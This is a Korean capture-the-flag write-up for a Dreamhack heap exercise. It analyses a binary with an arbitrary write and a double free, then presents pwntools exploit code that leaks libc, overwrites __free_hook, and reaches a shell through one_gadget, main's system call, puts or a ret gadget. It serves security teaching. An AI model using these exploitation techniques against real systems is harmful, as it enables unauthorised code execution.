# Exercise: hook

# 들어가며

## 서론

---

free 함수를 같은 주소에 대하여 2회 호출하면 생기는 일과, 우회하는 방법에 유의하여 실습한다.

# 분석 및 설계

## 분석

---

### 보호 기법

checksec을 사용하여 적용된 보호 기법을 살펴보면 다음과 같다.

```c
$ checksec basic_rop_x86
[*]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

해당 바이너리에 Full RELRO가 적용되어 있는 것을 확인 할 수 있다. 따라서 다른 문제들과 달리 GOT Overwrite가 불가능하다. 다른 항목들을 살펴보면 Canary가 존재하고, NX가 적용된다.

PIE는 적용되지 않아 바이너리의 원하는 함수 혹은 가젯의 주소를 알 수 있다.

### 코드 분석

```c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

main 함수에 malloc과 free 함수를 사용하여 메모리를 할당해주고, 다시 해제시켜주는 작업이 진행된다. free 함수가 호출되기 때문에 __free_hook을 다른 주소로 덮는다면, 원하는 기능을 수행할 수 있다.

*(long *)*ptr = *(ptr + 1)을 보자.

먼저 *ptr = ptr[0]이고, *(ptr + 1) = ptr[1]이다. 따라서 *(long *)ptr[0] = ptr[1] 이다. 즉 이를 확인해보면, ptr[0]에 들어있는 주소에 ptr[1]의 내용을 넣는 것이다. 따라서 임의의 주소에 임의의 값을 넣을 수 있다.

main 함수의 마지막에 system(”/bin/sh”) 로 셸이 실행되므로, free 함수를 통해 셸을 직접 호출 할 수도 있고, free 함수가 2번 호출되어 오류가 일어나는 것을 다른 함수로 바꾸어 오류를 방지해 셸을 획득 할 수도 있다.

# 익스플로잇

## 익스플로잇

---

### libc base 계산

처음에 stdout의 주소를 호출해주고 있으므로 이를 이용해 libc 주소를 계산할 수 있다.
stdout은 libc에 정의된 전역 변수로, FILE * 타입의 포인터이다.

```c
from pwn import *

p = remote("host3.dreamhack.games", 11606)
e = ELF("./hook")
libc = ELF("libc-2.23.so")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]

print(hex(libc_base))
```

### __free_hook 변조

변조해야 하는 주소는 다음과 같이 구할 수 있다.

```c
hook = libc_base + libc.symbols["__free_hook"]
```

따라서 free 대신 실행되어야 하는 기능의 주소를 구한 후, payload를 이용해 문제 해결이 가능하다.

```c
from pwn import *

p = remote("host3.dreamhack.games", 11606)
e = ELF("./hook")
libc = ELF("libc-2.23.so")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]

print(hex(libc_base))

p.sendline(b"16")

hook = libc_base + libc.symbols["__free_hook"]

payload = p64(hook) + p64(???)

p.sendlineafter(b"Data: ", payload)

p.interactive()
```

셸을 획득하기 위해서는 어떤 주소들을 활용할 수 있는지 확인해보자.

### one_gadget

앞 문제에서와 같이 one_gadget을 사용해서 셸을 획득 가능하다.

```c
$ one_gadget libc-2.23.so
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

```c
one_gadget = libc_base + [0x4527a, 0xf03a4, 0xf1247][0]
```

하지만 one_gadget은 확률적으로 작동하지 않는 경우도 있으므로, 다른 방법도 확인해보자.

### main의 system(”/bin/sh”)

main에서 system 함수를 이용해서 다른 작동을 하는 것이 아니라, 정확히 셸을 획득하기 위한 코드인 system(”/bin/sh”) 을 실행하고 있으므로, 해당 위치의 주소를 가져와 셸을 획득할 수 있다. 이때 PIE가 걸려 있지 않기 때문에 main의 주소가 정적이고, 따라서 main의 system(”/bin/sh”) 주소도 정적이다.

```c
   0x0000000000400a11 <+199>:   mov    edi,0x400aeb
   0x0000000000400a16 <+204>:   call   0x400788 <system@plt>
```

해당 부분에서 인자 설정과 함수 실행이 진행되기 때문에 0x400a11을 그대로 사용할 수 있다.

```c
main_system_sh = 0x400a11
```

다음으로 free 함수를 통해 셸을 직접 획득하는 것이 아닌, free가 2회 실행될 때의 에러만을 피해서 main의 system(”/bin/sh”)에 도달하여 셸을 획득하는 방법들을 보자.

### printf 혹은 puts

printf(ptr)이나 puts(ptr)을 실행하게 되면, ptr에 있는 문자열을 출력하고, 2회 진행하여도 문법상 문제가 생기지 않는다. 따라서 printf 혹은 puts의 주소를 libc에서 구하여 문제를 해결할 수 있다.

```c
0x7f2f2fddd000
[*] Loaded 14 cached gadgets for './hook'
[*] Loaded 171 cached gadgets for 'libc-2.23.so'
[*] Switching to interactive mode
\xa87\x1a0/\x7f
\xa87\x1a0/\x7f
$ ls
flag
hook
```

### ret 가젯

ret 가젯은 아무 명령을 수행하지 않고, 바로 다시 기존 위치로 돌아온다. 따라서 2회 시행되어도 문제가 발생하지 않는다.

PIE가 없기 때문에 바이너리에 있는 가젯을 사용하여도 되고, libc base를 알고 있기 때문에 libc에 있는 가젯을 사용하여도 된다.

```c
ret_binary = ROP(e).find_gadget(["ret"])[0]
ret_libc = libc_base + ROP(libc).find_gadget(["ret"])[0]
```

이 외도 다른 방법들이 있다.